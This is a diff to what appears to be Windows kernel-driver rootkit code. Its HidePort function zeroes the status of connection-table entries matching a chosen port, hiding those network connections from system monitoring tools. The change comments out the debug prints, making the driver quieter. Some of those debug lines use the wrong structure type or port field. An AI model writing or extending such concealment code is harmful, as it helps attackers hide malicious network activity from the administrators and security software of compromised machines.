@@ -147,14 +147,13 @@ VOID HidePort(PVOID outputBuffer, ULONG outputBufferSize, ULONG reqType, ULONG p
             entryCount = outputBufferSize / sizeof(CONNINFO101);
             for (i = 0; i < entryCount; ++i) {
                 if (task->isSrc) {
-                    DbgPrint("TYPE 0x101 SRC %d\n", HTONS(((PCONNINFO101)outputBuffer)[i].src_port));
+                    //DbgPrint("TYPE 0x101 SRC %d\n", HTONS(((PCONNINFO101)outputBuffer)[i].src_port));
                     if (HTONS(((PCONNINFO101)outputBuffer)[i].src_port) == task->port) {
                         ((PCONNINFO101)outputBuffer)[i].status = 0;
                     }
                 }
                 else {
-                    DbgPrint("TYPE 0x101 DST %d\n", HTONS(((PCONNINFO101)outputBuffer)[i].dst_port));
-
+                    //DbgPrint("TYPE 0x101 DST %d\n", HTONS(((PCONNINFO101)outputBuffer)[i].dst_port));
                     if (HTONS(((PCONNINFO101)outputBuffer)[i].dst_port) == task->port) {
                         ((PCONNINFO101)outputBuffer)[i].status = 0;
                     }
@@ -165,15 +164,13 @@ VOID HidePort(PVOID outputBuffer, ULONG outputBufferSize, ULONG reqType, ULONG p
             entryCount = outputBufferSize / sizeof(CONNINFO102);
             for (i = 0; i < entryCount; ++i) {
                 if (task->isSrc) {
-                    DbgPrint("TYPE 0x101 SRC %d\n", HTONS(((PCONNINFO101)outputBuffer)[i].src_port));
-
+                    //DbgPrint("TYPE 0x101 SRC %d\n", HTONS(((PCONNINFO101)outputBuffer)[i].src_port));
                     if (HTONS(((PCONNINFO102)outputBuffer)[i].src_port) == task->port) {
                         ((PCONNINFO102)outputBuffer)[i].status = 0;
                     }
                 }
                 else {
-                    DbgPrint("TYPE 0x101 DST %d\n", HTONS(((PCONNINFO101)outputBuffer)[i].dst_port));
-
+                    //DbgPrint("TYPE 0x101 DST %d\n", HTONS(((PCONNINFO101)outputBuffer)[i].dst_port));
                     if (HTONS(((PCONNINFO102)outputBuffer)[i].dst_port) == task->port) {
                         ((PCONNINFO102)outputBuffer)[i].status = 0;
                     }
@@ -184,15 +181,13 @@ VOID HidePort(PVOID outputBuffer, ULONG outputBufferSize, ULONG reqType, ULONG p
             entryCount = outputBufferSize / sizeof(CONNINFO110);
             for (i = 0; i < entryCount; ++i) {
                 if (task->isSrc) {
-                    DbgPrint("TYPE 0x101 SRC %d\n", HTONS(((PCONNINFO101)outputBuffer)[i].src_port));
-
+                    //DbgPrint("TYPE 0x101 SRC %d\n", HTONS(((PCONNINFO101)outputBuffer)[i].src_port));
                     if (HTONS(((PCONNINFO110)outputBuffer)[i].src_port) == task->port) {
                         ((PCONNINFO110)outputBuffer)[i].status = 0;
                     }
                 }
                 else {
-                    DbgPrint("TYPE 0x101 DST %d\n", HTONS(((PCONNINFO101)outputBuffer)[i].src_port));
-
+                    //DbgPrint("TYPE 0x101 DST %d\n", HTONS(((PCONNINFO101)outputBuffer)[i].src_port));
                     if (HTONS(((PCONNINFO110)outputBuffer)[i].dst_port) == task->port) {
                         ((PCONNINFO110)outputBuffer)[i].status = 0;
                     }
